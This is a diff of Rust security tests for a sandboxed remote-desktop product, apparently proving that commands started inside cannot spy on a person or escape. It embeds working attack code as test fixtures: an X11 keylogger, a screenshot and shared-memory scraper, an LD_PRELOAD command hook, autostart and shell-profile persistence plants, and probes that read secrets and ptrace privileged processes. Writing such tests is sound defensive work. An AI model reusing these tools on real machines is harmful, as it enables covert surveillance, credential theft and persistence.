@@ -101,15 +101,15 @@ async fn drive(p: &DockerProvider, m: &buwiz_computer::Machine, dir: &std::path:
     let alive = p.run(m, &a, "pgrep -c chromium", 10_000).await.unwrap();
     assert_ne!(alive.stdout.trim(), "0", "a light sleep keeps what's open");
     assert!(p.screenshot(m, &a).await.is_ok(), "published ports answer through the wall");
-    // what a model could leave in the box's home: it runs at the next start, and the wall is
-    // already up, because the box's network is older than the box. The Mac's loopback listens here.
+    // what could be left on a desktop's home, by something run there: it runs at the next start, and
+    // the wall is already up, because the box's network is older than the box. The Mac's loopback
+    // listens here.
     let plant = format!(
         r#"mkdir -p ~/.config/autostart; printf '%s\n' {autostart} > ~/.config/autostart/c2probe.desktop; printf '%s\n' {script} > ~/c2probe.py"#,
-        autostart = "'[Desktop Entry]' 'Type=Application' 'Name=c2probe' 'Exec=python3 /home/box/c2probe.py'",
-        script = shell_lines(&format!("import socket,time\nout=open('/workspace/c2probe.log','a')\nout.write('ran\\n')\nfor host,port in [('host.docker.internal',{port}),('192.168.65.254',{port}),('gateway.docker.internal',{port}),('example.com',443)]:\n    s=socket.socket();s.settimeout(3)\n    try:\n        s.connect((socket.gethostbyname(host),port));out.write(host+' REACHED\\n')\n    except Exception:\n        out.write(host+' blocked\\n')\nout.write('done\\n')\nout.close()\n")),
+        autostart = "'[Desktop Entry]' 'Type=Application' 'Name=c2probe' 'Exec=python3 /home/box/desktops/c2t_a/c2probe.py'",
+        script = shell_lines(&format!("import socket,time\nout=open('/home/box/desktops/c2t_a/c2probe.log','a')\nout.write('ran\\n')\nfor host,port in [('host.docker.internal',{port}),('192.168.65.254',{port}),('gateway.docker.internal',{port}),('example.com',443)]:\n    s=socket.socket();s.settimeout(3)\n    try:\n        s.connect((socket.gethostbyname(host),port));out.write(host+' REACHED\\n')\n    except Exception:\n        out.write(host+' blocked\\n')\nout.write('done\\n')\nout.close()\n")),
     );
-    let planted = p.run(m, &a, &plant, 10_000).await.unwrap();
-    assert_eq!(planted.exit_code, Some(0), "{}", planted.stderr);
+    on_desktop(m, "c2t_a", &a, &plant);
     p.sleep(m, Sleep::Deep).await.unwrap();
     assert_eq!(p.power(m).await.unwrap(), Power::Asleep);
     p.wake(m).await.unwrap();
@@ -117,7 +117,7 @@ async fn drive(p: &DockerProvider, m: &buwiz_computer::Machine, dir: &std::path:
     assert_eq!(up.display, a.display, "a Bot keeps its screen's number");
     let mut log = String::new();
     for _ in 0..60 {
-        log = p.run(m, &a, "cat /workspace/c2probe.log 2>/dev/null", 5000).await.unwrap().stdout;
+        log = on_desktop(m, "c2t_a", &a, "cat ~/c2probe.log 2>/dev/null");
         if log.contains("done") {
             break;
         }
@@ -147,6 +147,23 @@ fn name_of(m: &buwiz_computer::Machine) -> String {
         buwiz_computer::Reach::Container { name } => name.clone(),
         other => panic!("{other:?}"),
     }
+}
+
+/// `bot`'s two users, by the file only root writes.
+fn users_of(m: &buwiz_computer::Machine, bot: &str) -> (u32, u32) {
+    let index: u32 = docker(&["exec", "--user", "0", &name_of(m), "cat", &format!("/home/box/.box/bots/{bot}")]).parse().unwrap();
+    (20000 + 2 * index, 20001 + 2 * index)
+}
+
+/// `script` as `bot`'s desktop user, with what that user has: the screen's cookie, its home and
+/// the Bot's folder through the group. That's where a thing started by clicks runs.
+fn on_desktop(m: &buwiz_computer::Machine, bot: &str, screen: &Screen, script: &str) -> String {
+    let (agent, desktop) = users_of(m, bot);
+    let n = screen.display.trim_start_matches(':');
+    docker(&[
+        "exec", "--user", "0", &name_of(m), "setpriv", &format!("--reuid={desktop}"), &format!("--regid={desktop}"), &format!("--groups={agent},1400"), "--inh-caps=-all",
+        "env", "-i", "PATH=/usr/local/bin:/usr/bin:/bin", &format!("HOME=/home/box/desktops/{bot}"), &format!("DISPLAY=:{n}"), &format!("XAUTHORITY=/run/box/x/{n}/auth"), "sh", "-c", script,
+    ])
 }
 
 /// Connects from `from`'s source port, or any, as a process in the box could.
@@ -194,18 +211,18 @@ async fn lost_and_peers(p: &DockerProvider, a: &buwiz_computer::Machine, b: &buw
     // the capabilities, as Docker holds them; the wall went up anyway
     assert!(docker(&["inspect", &format!("{na}-wall"), "--format", "{{.HostConfig.CapDrop}}"]).contains("ALL"));
     let caps = docker(&["inspect", &na, "--format", "{{.HostConfig.CapDrop}} {{.HostConfig.CapAdd}}"]);
-    assert!(caps.contains("NET_RAW") && !caps.contains("NET_ADMIN"), "{caps}");
+    assert!(caps.contains("ALL") && !caps.contains("NET_ADMIN") && !caps.contains("NET_RAW"), "{caps}");
 
     // a peer on the same network, from any port and from an exempt one
     let peer = docker(&["inspect", &format!("{nb}-wall"), "--format", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}"]);
     assert!(!peer.is_empty());
-    let (any, exempt) = (reach(&peer, 1337, 0), reach(&peer, 1337, 6905));
-    for (what, cmd) in [("any port", any), ("exempt port", exempt)] {
-        let out = p.run(a, &screen, &cmd, 10_000).await.unwrap();
-        println!("to a peer from {what}: {}", out.stdout.trim());
-        // refused here, by this box's own wall: a timeout would mean the packet left it
-        assert!(out.stdout.contains("blocked OSError"), "{what}: {} {}", out.stdout, out.stderr);
-    }
+    let out = p.run(a, &screen, &reach(&peer, 1337, 0), 10_000).await.unwrap();
+    println!("to a peer: {}", out.stdout.trim());
+    // refused here, by this box's own wall: a timeout would mean the packet left it
+    assert!(out.stdout.contains("blocked OSError"), "{} {}", out.stdout, out.stderr);
+    // and a command can't send from a port the wall lets through at all
+    let out = p.run(a, &screen, &reach(&peer, 1337, 6905), 10_000).await.unwrap();
+    assert!(out.stderr.contains("PermissionError") && !out.stdout.contains("REACHED"), "{} {}", out.stdout, out.stderr);
 
     // files, through every way a container can go
     for (what, gone) in [("holder", vec![format!("{na}-wall")]), ("box", vec![na.clone()]), ("both", vec![na.clone(), format!("{na}-wall")])] {
@@ -289,9 +306,10 @@ fn command(text: &str) -> Vec<u8> {
 
 async fn pointer(p: &DockerProvider, m: &buwiz_computer::Machine, screen: &Screen) -> String {
     tokio::time::sleep(std::time::Duration::from_millis(400)).await;
-    let out = p.run(m, screen, "xdotool getmouselocation --shell | head -2 | tr '\\n' ' '", 5000).await.unwrap();
-    assert_eq!(out.exit_code, Some(0), "{}", out.stderr);
-    out.stdout.trim().to_owned()
+    let _ = p;
+    let out = docker(&["exec", "--user", "990", "-e", &format!("DISPLAY={}", screen.display), "-e", "XAUTHORITY=/run/box/x/svc.auth", &name_of(m), "sh", "-c", "xdotool getmouselocation --shell | head -2 | tr '\\n' ' '"]);
+    assert!(out.contains("X="), "{out}");
+    out
 }
 
 /// The real viewer, through the real gate: only the gate stands between a watcher and the desktop.
@@ -421,7 +439,7 @@ for port in sys.argv[2:]:
 "#;
 
 /// What a planted autostart would do at a start: read the staged files as fast as it can.
-const EARLY: &str = "import os,time\nout=open('/workspace/c2early.log','a')\nout.write('began %.3f\\n'%time.time());out.flush()\nend=time.time()+20\nhit=0\nseen=0\nn=0\nwhile time.time()<end:\n    n+=1\n    for p in ['/run/buwiz-computer/viewer','/run/buwiz-computer/token']:\n        try:\n            if os.path.exists(p):\n                seen+=1\n            d=open(p).read()\n            if d:\n                hit+=1\n                out.write('READ '+p+' '+str(len(d))+' after '+str(n)+'\\n');out.flush()\n        except Exception as e:\n            pass\n    time.sleep(0.002)\nout.write('done hits='+str(hit)+' seen='+str(seen)+' tries='+str(n)+'\\n');out.close()\n";
+const EARLY: &str = "import os,time\nout=open(os.path.expanduser('~/c2early.log'),'a')\nout.write('began %.3f\\n'%time.time());out.flush()\nend=time.time()+20\nhit=0\nseen=0\nn=0\nwhile time.time()<end:\n    n+=1\n    for p in ['/run/buwiz-computer/viewer','/run/buwiz-computer/token']:\n        try:\n            if os.path.exists(p):\n                seen+=1\n            d=open(p).read()\n            if d:\n                hit+=1\n                out.write('READ '+p+' '+str(len(d))+' after '+str(n)+'\\n');out.flush()\n        except Exception as e:\n            pass\n    time.sleep(0.002)\nout.write('done hits='+str(hit)+' seen='+str(seen)+' tries='+str(n)+'\\n');out.close()\n";
 
 /// From inside, as `computer_run` is: the secrets can't be read, by file or from any process, and
 /// the viewers answer nothing without them. Not at a start either, for something planted to run then.
@@ -450,13 +468,13 @@ async fn hunt(p: &DockerProvider, m: &buwiz_computer::Machine) {
     let a = p.screen_up(m, "c2s_a").await.unwrap();
     let control = "c2s-control-value-held-in-memory";
     let needles = format!("{}\n{}\n{control}\n", m.viewer_password.expose(), m.token.expose());
-    p.write_file(m, "needles", needles.as_bytes()).await.unwrap();
+    p.write_file(m, "agents/c2s_a/needles", needles.as_bytes()).await.unwrap();
     // the hunt must be able to find what's there: an ordinary process holds this, built at run time
     let holder = r#"setsid nohup python3 -c "x='c2s-control-'+'value-held-in-memory'.strip();import time;time.sleep(60)" >/dev/null 2>&1 &"#;
     assert_eq!(p.run(m, &a, holder, 5000).await.unwrap().exit_code, Some(0));
     tokio::time::sleep(std::time::Duration::from_millis(500)).await;
     let quoted = HUNT.replace('\'', "'\\''");
-    let out = p.run(m, &a, &format!("python3 -c '{quoted}' /workspace/needles 6901 {}", a.viewer_port), 60_000).await.unwrap();
+    let out = p.run(m, &a, &format!("python3 -c '{quoted}' /workspace/agents/c2s_a/needles 6901 {}", a.viewer_port), 60_000).await.unwrap();
     println!("the hunt:\n{}\n{}", out.stdout, out.stderr);
     assert_eq!(out.exit_code, Some(0), "{}", out.stderr);
     let found: Vec<&str> = out.stdout.lines().filter(|l| l.starts_with("FOUND")).collect();
@@ -471,12 +489,15 @@ async fn hunt(p: &DockerProvider, m: &buwiz_computer::Machine) {
         assert!(line.contains(" 401"), "a viewer answered with no password: {line}");
     }
 
-    // planted to run at a start, in every place a start reads from the home that outlives it
+    // what a command leaves in its own home has nothing to start it
+    let plant = "mkdir -p ~/.config/autostart; printf '%s\\n' '[Desktop Entry]' 'Type=Application' 'Name=c2own' 'Exec=touch /tmp/c2own' > ~/.config/autostart/c2own.desktop; printf 'touch /tmp/c2own\\n' | tee -a ~/.bashrc ~/.profile ~/.xsessionrc >/dev/null";
+    assert_eq!(p.run(m, &a, plant, 10_000).await.unwrap().exit_code, Some(0));
+    // planted to run at a start, in every place a desktop's start reads from the home that outlives it
     let plant = format!(
-        r#"mkdir -p ~/.config/autostart; printf '%s\n' '[Desktop Entry]' 'Type=Application' 'Name=c2early' 'Exec=python3 /home/box/c2early.py' > ~/.config/autostart/c2early.desktop; printf '%s\n' {script} > ~/c2early.py; printf 'python3 /home/box/c2early.py &\n' | tee -a ~/.bashrc ~/.profile ~/.xsessionrc >/dev/null"#,
+        r#"mkdir -p ~/.config/autostart; printf '%s\n' '[Desktop Entry]' 'Type=Application' 'Name=c2early' 'Exec=python3 /home/box/desktops/c2s_a/c2early.py' > ~/.config/autostart/c2early.desktop; printf '%s\n' {script} > ~/c2early.py; printf 'python3 /home/box/desktops/c2s_a/c2early.py &\n' | tee -a ~/.bashrc ~/.profile ~/.xsessionrc >/dev/null"#,
         script = shell_lines(EARLY),
     );
-    assert_eq!(p.run(m, &a, &plant, 10_000).await.unwrap().exit_code, Some(0));
+    on_desktop(m, "c2s_a", &a, &plant);
     p.sleep(m, Sleep::Deep).await.unwrap();
     let began = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs_f64();
     p.wake(m).await.unwrap();
@@ -485,7 +506,7 @@ async fn hunt(p: &DockerProvider, m: &buwiz_computer::Machine) {
     p.screen_up(m, "c2s_a").await.unwrap();
     let mut log = String::new();
     for _ in 0..60 {
-        log = p.run(m, &a, "cat /workspace/c2early.log 2>/dev/null", 5000).await.unwrap().stdout;
+        log = on_desktop(m, "c2s_a", &a, "cat ~/c2early.log 2>/dev/null");
         if log.contains("done") {
             break;
         }
@@ -494,14 +515,19 @@ async fn hunt(p: &DockerProvider, m: &buwiz_computer::Machine) {
     println!("planted at a start:\n{log}");
     assert!(log.contains("done"), "the planted reader never ran: {log}");
     assert!(!log.contains("READ"), "something planted read a staged secret at a start: {log}");
+    assert_eq!(p.run(m, &a, "ls /tmp/c2own 2>/dev/null", 5000).await.unwrap().stdout, "", "a start ran what a command left");
 }
 
 /// A keylogger as a command could leave one: XInput2 raw key events on the root, over the X socket.
+/// It offers `KL_COOKIE` when it has one, and says so when X turns it away.
 const KEYLOGGER: &str = r#"
-import socket, struct, sys, time
+import os, socket, struct, sys, time
 log = open(sys.argv[2], 'a', buffering=1)
 s = socket.socket(socket.AF_UNIX); s.connect('/tmp/.X11-unix/X' + sys.argv[1].lstrip(':'))
-s.sendall(struct.pack('<BxHHHHxx', 0x6c, 11, 0, 0, 0))
+cookie = bytes.fromhex(os.environ.get('KL_COOKIE', ''))
+name = b'MIT-MAGIC-COOKIE-1' if cookie else b''
+pad = lambda b: b + b'\0' * (-len(b) % 4)
+s.sendall(struct.pack('<BxHHHHxx', 0x6c, 11, 0, len(name), len(cookie)) + pad(name) + pad(cookie))
 def rd(n):
     b = b''
     while len(b) < n:
@@ -511,9 +537,12 @@ def rd(n):
         b += c
     return b
 h = rd(8); d = rd(struct.unpack('<H', h[6:8])[0] * 4)
+if h[0] != 1:
+    log.write('refused\n')
+    sys.exit(0)
 root = struct.unpack('<I', d[32 + ((struct.unpack('<H', d[16:18])[0] + 3) & ~3) + 8 * d[21]:][:4])[0]
-name = b'XInputExtension'; pad = (-len(name)) % 4
-s.sendall(struct.pack('<BxHHxx', 98, 2 + (len(name) + pad) // 4, len(name)) + name + b'\0' * pad)
+name = b'XInputExtension'; extra = (-len(name)) % 4
+s.sendall(struct.pack('<BxHHxx', 98, 2 + (len(name) + extra) // 4, len(name)) + name + b'\0' * extra)
 major = rd(32)[9]
 s.sendall(struct.pack('<BBHHH', major, 47, 2, 2, 2)); rd(32)
 s.sendall(struct.pack('<BBHIHxx', major, 46, 5, root, 1) + struct.pack('<HH', 1, 1) + struct.pack('<I', 1 << 13))
@@ -527,132 +556,498 @@ while True:
         log.write('key %d\n' % struct.unpack('<I', e[16:20])[0])
 "#;
 
-/// Starts `box-keeper` as the box user at pid `argv[1]`, under pid 1, blocked on a fifo.
-const DECOY: &str = r#"
-import ctypes, os, signal, struct, sys
-os.mkfifo('/tmp/decoy.fifo', 0o666)
-pid = int(sys.argv[1])
-tid = (ctypes.c_int32 * 1)(pid)
-args = struct.pack('=11Q', 0, 0, 0, 0, signal.SIGCHLD, 0, 0, 0, ctypes.addressof(tid), 1, 0)
+/// A screenshot loop, every way a command has: X's own tools on each screen, and every shared
+/// memory segment in the box, the framebuffer of an Xvfb run with `-shmem` among them.
+const PEEK: &str = r#"
+import ctypes, os, subprocess, sys, time
 libc = ctypes.CDLL(None, use_errno=True)
-keep = os.fork()
-if keep:
-    os.waitpid(keep, 0)
-    print('decoy', pid if open('/tmp/decoy.ok').read() == 'ok' else 'failed')
-    sys.exit(0)
-got = libc.syscall(435, ctypes.c_char_p(args), len(args))
-if got > 0:
-    open('/tmp/decoy.ok', 'w').write('ok')
-    os._exit(0)
-if got < 0:
-    open('/tmp/decoy.ok', 'w').write('errno %d' % ctypes.get_errno())
-    os._exit(1)
-if got == 0:
-    # or `docker exec` waits on these for as long as it blocks
-    null = os.open('/dev/null', os.O_RDWR)
-    for fd in (0, 1, 2):
-        os.dup2(null, fd)
-    os.setgroups([])
-    os.setgid(1000)
-    os.setuid(1000)
-    os.setsid()
-    os.execve('/usr/local/bin/box-keeper', ['box-keeper'], {'BOX_TOKEN_FILE': '/tmp/decoy.fifo', 'HOME': '/home/box', 'PATH': '/usr/bin:/bin'})
+libc.shmat.restype = ctypes.c_void_p
+libc.shmat.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
+for round in range(3):
+    for display in sys.argv[1:]:
+        env = dict(os.environ, DISPLAY=display)
+        shot = '/tmp/peek-%s.png' % os.getpid()
+        got = subprocess.run(['import', '-window', 'root', shot], env=env, capture_output=True, timeout=10)
+        if got.returncode == 0 and os.path.exists(shot) and os.path.getsize(shot):
+            print('PICTURE', display)
+        print('import', display, got.returncode)
+    for line in open('/proc/sysvipc/shm').read().splitlines()[1:]:
+        fields = line.split()
+        at = libc.shmat(int(fields[1]), None, 0o10000)
+        if at not in (None, ctypes.c_void_p(-1).value):
+            data = ctypes.string_at(at, min(int(fields[3]), 1 << 20))
+            print('SEGMENT', fields[1], 'mode', fields[2], 'bytes', sum(1 for b in data if b))
+        else:
+            print('segment', fields[1], 'denied')
+    time.sleep(0.3)
 "#;
 
-/// What a hand-over clears: what commands left, wherever it hides, and none of the desktop.
-#[tokio::test(flavor = "multi_thread")]
-#[ignore = "needs Docker and the computer image"]
-async fn clearing_ends_what_commands_left_and_spares_the_desktop() {
+/// From a command: everything it mustn't be able to do, each on one line, `DID ...` when it could.
+const REACH_OUT: &str = r#"
+import ctypes, os, signal, socket, sys
+libc = ctypes.CDLL(None, use_errno=True)
+PTRACE_SEIZE = 0x4206
+me = os.getuid()
+names = {'box-keeper', 'box-exec', 'box-host', 'voxl', 'Xvfb', 'xfce4-session', 'xfwm4', 'xfce4-panel', 'chromium', 'tini'}
+seen = set()
+for d in os.listdir('/proc'):
+    if not d.isdigit():
+        continue
+    pid = int(d)
+    try:
+        comm = open('/proc/%d/comm' % pid).read().strip()
+        owner = os.stat('/proc/%d' % pid).st_uid
+    except OSError:
+        continue
+    if comm not in names:
+        continue
+    seen.add(comm)
+    if owner == me:
+        print('DID own', comm, pid)
+    try:
+        os.kill(pid, signal.SIGCONT)
+        print('DID signal', comm, pid)
+    except PermissionError:
+        pass
+    except ProcessLookupError:
+        pass
+    if libc.ptrace(PTRACE_SEIZE, pid, 0, 0) == 0:
+        print('DID ptrace', comm, pid)
+    for what in ('mem', 'environ', 'fd'):
+        try:
+            if what == 'fd':
+                os.listdir('/proc/%d/fd' % pid)
+            else:
+                open('/proc/%d/%s' % (pid, what), 'rb').read(1)
+            print('DID read', what, comm, pid)
+        except OSError:
+            pass
+print('saw', ' '.join(sorted(seen)))
+for path in sys.argv[1:]:
+    try:
+        if os.path.isdir(path):
+            print('DID list', path, os.listdir(path)[:3])
+        else:
+            print('DID read', path, len(open(path, 'rb').read()))
+    except OSError:
+        pass
+for port in [1337, 1340, 6901, 6902, 6903, 6904, 6905, 80, 3000]:
+    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        s.bind(('127.0.0.1', port)); s.listen(1); print('DID bind', port)
+    except PermissionError:
+        pass
+    except OSError as e:
+        print('DID bind-try', port, e)
+    s.close()
+s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind(('127.0.0.1', 8123)); s.listen(1); print('own port ok')
+try:
+    open('/tmp/.X11-unix/X9', 'w'); print('DID plant a socket')
+except OSError:
+    pass
+fields = dict(l.split(':', 1) for l in open('/proc/self/status').read().splitlines() if ':' in l)
+print('uid', fields['Uid'].split()[0], 'caps', fields['CapEff'].strip(), fields['CapPrm'].strip(), fields['CapInh'].strip(), fields['CapAmb'].strip(), 'nnp', fields['NoNewPrivs'].strip())
+print('env', sorted(k for k in os.environ if k.startswith(('BOX_', 'XAUTH', 'DISPLAY', 'VOXL', 'LD_'))))
+"#;
+
+/// A library that starts `HOOK_CMD` from inside whatever it's preloaded into.
+const HOOK: &str = r#"
+#include <stdlib.h>
+#include <unistd.h>
+__attribute__((constructor)) static void hook(void) {
+    const char *cmd = getenv("HOOK_CMD");
+    if (!cmd) return;
+    unsetenv("HOOK_CMD");
+    if (fork() == 0) {
+        unsetenv("LD_PRELOAD");
+        setsid();
+        execl("/bin/sh", "sh", "-c", cmd, (char *)0);
+        _exit(1);
+    }
+}
+"#;
+
+/// [`HOOK`], built for the box's machine by Docker, so the test needs no compiler of its own.
+fn hook_library(dir: &std::path::Path) -> Vec<u8> {
+    use std::io::Write;
+    std::fs::write(dir.join("hook.c"), HOOK).unwrap();
+    let recipe = "FROM rust:1.85-bookworm AS build\nCOPY hook.c /hook.c\nRUN gcc -shared -fPIC -o /hook.so /hook.c\nFROM scratch\nCOPY --from=build /hook.so /hook.so\n";
+    let mut child = std::process::Command::new("docker").args(["build", "--quiet", "--output", &format!("type=local,dest={}", dir.join("out").display()), "-f", "-", &dir.display().to_string()]).stdin(std::process::Stdio::piped()).stdout(std::process::Stdio::null()).spawn().unwrap();
+    child.stdin.take().unwrap().write_all(recipe.as_bytes()).unwrap();
+    assert!(child.wait().unwrap().success(), "the test's library wouldn't build");
+    std::fs::read(dir.join("out/hook.so")).unwrap()
+}
+
+/// A person types: the key reaches the screen through the real gate, as a viewer sends it.
+async fn type_key(ws: &mut TcpStream, code: u32) {
+    ws.write_all(&command(&format!("k,{code},1"))).await.unwrap();
+    ws.write_all(&command(&format!("k,{code},0"))).await.unwrap();
+    tokio::time::sleep(std::time::Duration::from_millis(600)).await;
+}
+
+async fn with_computer<F, Fut>(prefix: &'static str, test: F)
+where
+    F: FnOnce(DockerProvider, buwiz_computer::Machine, PathBuf) -> Fut + Send + 'static,
+    Fut: std::future::Future<Output = ()> + Send + 'static,
+{
     let image = std::env::var(IMAGE_ENV).unwrap_or_else(|_| "buwiz-computer:local".to_owned());
-    let dir: PathBuf = std::env::temp_dir().join(format!("c2k-{}", std::process::id()));
+    let dir: PathBuf = std::env::temp_dir().join(format!("{prefix}-{}", std::process::id()));
     std::fs::create_dir_all(&dir).unwrap();
-    let p = DockerProvider::new(image.clone(), "c2k");
+    let p = DockerProvider::new(image.clone(), prefix);
     p.check().await.unwrap_or_else(|e| panic!("this test needs Docker and the image: {e}"));
-    let m = p.create(&Spec { id: "cmp_c2ktest".into(), dir: dir.clone() }).await.unwrap();
+    let m = p.create(&Spec { id: format!("cmp_{prefix}test"), dir: dir.clone() }).await.unwrap();
     let outcome = tokio::spawn({
-        let m = m.clone();
-        async move { clear(&DockerProvider::new(image, "c2k"), &m).await }
+        let (m, dir) = (m.clone(), dir.clone());
+        async move { test(DockerProvider::new(image, prefix), m, dir).await }
     })
     .await;
-    docker(&["rm", "-f", &format!("{}-helper", name_of(&m))]);
     p.destroy(&m).await.unwrap();
-    let _ = std::process::Command::new("docker").args(["network", "rm", "c2k-net"]).output();
+    let _ = std::process::Command::new("docker").args(["network", "rm", &format!("{prefix}-net")]).output();
     let _ = std::fs::remove_dir_all(&dir);
     outcome.unwrap();
 }
 
-async fn clear(p: &DockerProvider, m: &buwiz_computer::Machine) {
+/// The point of it all. A person types on a real screen through the real gate, with a keylogger, a
+/// screenshot loop and an `LD_PRELOAD` into an allowed program, each started from `computer_run`.
+/// Beside each, the same thing as the desktop's user, which has the cookie: it does see, so the
+/// attack works and it's the wall that stops it.
+#[tokio::test(flavor = "multi_thread")]
+#[ignore = "needs Docker and the computer image"]
+async fn what_a_command_starts_cant_see_a_person() {
+    with_computer("c2p", |p, m, dir| async move { watched_person(&p, &m, &dir).await }).await;
+}
+
+async fn watched_person(p: &DockerProvider, m: &buwiz_computer::Machine, dir: &std::path::Path) {
+    p.wake(m).await.unwrap();
+    let a = p.screen_up(m, "c2p_a").await.unwrap();
+    let b = p.screen_up(m, "c2p_b").await.unwrap();
+    let hook = hook_library(dir);
+    let folder = format!("/workspace/{}", a.folder);
+    p.write_file(m, &format!("{folder}/kl.py"), KEYLOGGER.as_bytes()).await.unwrap();
+    p.write_file(m, &format!("{folder}/peek.py"), PEEK.as_bytes()).await.unwrap();
+    p.write_file(m, &format!("{folder}/hook.so"), &hook).await.unwrap();
+    let read = async |file: &str| p.read_file(m, &format!("{folder}/{file}")).await.map(|b| String::from_utf8_lossy(&b).into_owned()).unwrap_or_default();
+
+    // a browser on the screen: its window is shared memory, and what a person sees is in there
+    p.open_url(m, &a, "http://127.0.0.1:1/").await.unwrap();
+    tokio::time::sleep(std::time::Duration::from_secs(4)).await;
+    let (_, desktop_a) = users_of(m, "c2p_a");
+    let segments = docker(&["exec", "--user", "0", &name_of(m), "sh", "-c", &format!("awk '$8 == {desktop_a} && $4 > 2000000' /proc/sysvipc/shm | wc -l")]);
+    assert_ne!(segments, "0", "a browser window should be in shared memory, or the loop proves nothing");
+
+    // from computer_run, on every screen, by every way in
+    let displays = [":1".to_owned(), a.display.clone(), b.display.clone()];
+    for (i, display) in displays.iter().enumerate() {
+        let started = p.run(m, &a, &format!("setsid nohup python3 kl.py {display} keys-{i}.log >/dev/null 2>&1 &"), 5000).await.unwrap();
+        assert_eq!(started.exit_code, Some(0), "{}", started.stderr);
+    }
+    let preload = format!("timeout 5 env HOOK_CMD='python3 {folder}/kl.py {} {folder}/keys-preload.log' LD_PRELOAD={folder}/hook.so /usr/bin/xfwm4 >/dev/null 2>&1; true", a.display);
+    assert_eq!(p.run(m, &a, &preload, 10_000).await.unwrap().exit_code, Some(0));
+    let peek = p.run(m, &a, &format!("python3 peek.py {}", displays.join(" ")), 60_000).await.unwrap();
+    println!("the screenshot loop:\n{}\n{}", peek.stdout, peek.stderr);
+    assert_eq!(peek.exit_code, Some(0), "{}", peek.stderr);
+
+    // the same, as the desktop: it's what proves the rest
+    let cookie = on_desktop(m, "c2p_a", &a, "xauth list | awk '{print $3}'");
+    assert_eq!(cookie.len(), 32, "{cookie}");
+    let quoted = KEYLOGGER.replace('\'', "'\\''");
+    on_desktop(m, "c2p_a", &a, &format!("KL_COOKIE={cookie} setsid nohup python3 -c '{quoted}' {} $HOME/control.log >/dev/null 2>&1 &", a.display));
+    on_desktop(m, "c2p_a", &a, &format!("cp {folder}/hook.so {folder}/kl.py $HOME/; KL_COOKIE={cookie} HOOK_CMD=\"python3 $HOME/kl.py {} $HOME/control-preload.log\" LD_PRELOAD=$HOME/hook.so timeout 5 /usr/bin/xfwm4 >/dev/null 2>&1; true", a.display));
+    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
+
+    let gate = Gate::start().await.unwrap();
+    let (mut ws, ..) = real_socket(&gate, "c2p_a", p.viewer(m, &a).await.unwrap().unwrap(), Mode::Drive).await;
+    for code in [97, 98, 99] {
+        type_key(&mut ws, code).await;
+    }
+    let control = on_desktop(m, "c2p_a", &a, "cat $HOME/control.log");
+    println!("the desktop's keylogger: {control:?}");
+    assert_eq!(control.matches("key ").count(), 3, "the keylogger must work, or this proves nothing: {control}");
+    let through = on_desktop(m, "c2p_a", &a, "cat $HOME/control-preload.log");
+    assert_eq!(through.matches("key ").count(), 3, "the library must work, or this proves nothing: {through}");
+    let shot = on_desktop(m, "c2p_a", &a, "import -window root /tmp/ctl.png && test -s /tmp/ctl.png && echo PICTURE");
+    assert!(shot.contains("PICTURE"), "the screenshot must work, or this proves nothing: {shot}");
+    let (mut there, mut none) = (String::new(), 0);
+    for i in 0..3 {
+        let log = read(&format!("keys-{i}.log")).await;
+        println!("{} from computer_run: {log:?}", displays[i]);
+        none += usize::from(log.contains("refused"));
+        there.push_str(&log);
+    }
+    let preloaded = read("keys-preload.log").await;
+    println!("through LD_PRELOAD: {preloaded:?}");
+    assert!(!there.contains("key ") && !preloaded.contains("key "), "a command saw a person's keys: {there} {preloaded}");
+    assert!(!there.contains("ready") && !preloaded.contains("ready"), "a command got onto a screen: {there} {preloaded}");
+    assert_eq!(none, 3, "each keylogger must have reached X and been turned away, or it tried nothing: {there}");
+    assert!(preloaded.contains("refused"), "the library must have run: {preloaded}");
+    assert!(!peek.stdout.contains("PICTURE"), "a command took a picture:\n{}", peek.stdout);
+    assert!(!peek.stdout.contains("SEGMENT"), "a command read shared memory:\n{}", peek.stdout);
+    assert!(peek.stdout.contains("import :1 "), "the loop must have run: {}", peek.stdout);
+}
+
+/// What a command can and can't touch, for two Bots on one computer, and what still works.
+#[tokio::test(flavor = "multi_thread")]
+#[ignore = "needs Docker and the computer image"]
+async fn a_commands_user_reaches_its_own_files_and_nothing_else() {
+    with_computer("c2r", |p, m, _| async move { walled(&p, &m).await }).await;
+}
+
+async fn walled(p: &DockerProvider, m: &buwiz_computer::Machine) {
+    p.wake(m).await.unwrap();
+    let a = p.screen_up(m, "c2r_a").await.unwrap();
+    let b = p.screen_up(m, "c2r_b").await.unwrap();
+    p.open_url(m, &b, "http://127.0.0.1:1/").await.unwrap();
+    p.open_url(m, &a, "http://127.0.0.1:1/").await.unwrap();
+    tokio::time::sleep(std::time::Duration::from_secs(4)).await;
+    let (na, nb) = (a.display.trim_start_matches(':'), b.display.trim_start_matches(':'));
+    let targets = [
+        "/run/box/x/svc.auth".to_owned(), format!("/run/box/x/{na}/auth"), format!("/run/box/x/{nb}/auth"), "/run/box/x/1/auth".to_owned(), "/run/box/keeper.sock".to_owned(),
+        "/home/box/desktops/c2r_a".to_owned(), "/home/box/desktops/c2r_a/chrome-profile".to_owned(), "/home/box/desktops/c2r_b/chrome-profile".to_owned(), "/home/box/desktops/main".to_owned(), "/home/box/desktops/main/chrome-profile".to_owned(), "/home/box/agents/c2r_b".to_owned(), "/workspace/agents/c2r_b".to_owned(), "/workspace/agents".to_owned(), "/home/box/agents".to_owned(),
+    ];
+    let quoted = REACH_OUT.replace('\'', "'\\''");
+    let out = p.run(m, &a, &format!("python3 -c '{quoted}' {}", targets.join(" ")), 30_000).await.unwrap();
+    println!("from a command:\n{}\n{}", out.stdout, out.stderr);
+    assert_eq!(out.exit_code, Some(0), "{}", out.stderr);
+    let did: Vec<&str> = out.stdout.lines().filter(|l| l.starts_with("DID")).collect();
+    assert!(did.is_empty(), "{did:#?}");
+    let saw = out.stdout.lines().find(|l| l.starts_with("saw ")).unwrap();
+    for name in ["box-exec", "box-host", "box-keeper", "chromium", "tini", "voxl", "Xvfb", "xfce4-session"] {
+        assert!(saw.contains(name), "it never tried {name}: {saw}");
+    }
+    assert!(out.stdout.contains("own port ok"), "a port above the floor is the Bot's: {}", out.stdout);
+    let (agent_a, desktop_a) = users_of(m, "c2r_a");
